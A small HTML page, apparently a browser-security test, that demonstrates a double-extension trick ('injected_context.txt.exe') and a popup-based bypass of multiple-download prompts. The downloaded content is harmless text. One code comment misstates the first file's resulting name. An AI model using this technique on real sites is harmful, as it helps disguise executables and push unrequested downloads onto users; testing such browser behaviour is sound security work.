<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Tech 2 – Double ext</title>
<style>/* same */</style>
</head>
<body>
<h2>Bypass Multiple Download</h2>
<button onclick="run()">Execute Injection</button>
<pre id="out" style="margin:10px auto;width:100%;text-align:left;"></pre>
<script>
function download(name, content){
  // menambahkan ekstensi .exe secara harfiah ke nama file
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
  a.download = name + '.exe'; // jadi main_context.txt.exe
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}
function run(){
  download('main_context', 'Main content'); // tanpa .txt, jadi main_context.txt.exe
  setTimeout(()=>{
    const win = window.open('', '_blank');
    if(win){
      win.document.write(`<script>setTimeout(()=>{const a=document.createElement('a');
        a.href=URL.createObjectURL(new Blob(['Injected content'],{type:'text/plain'}));
        a.download='injected_context.txt.exe';
        document.body.appendChild(a);a.click();},300);<\/script>`);
      win.document.close();
    }
  },500);
}
</script>
</body>
</html>
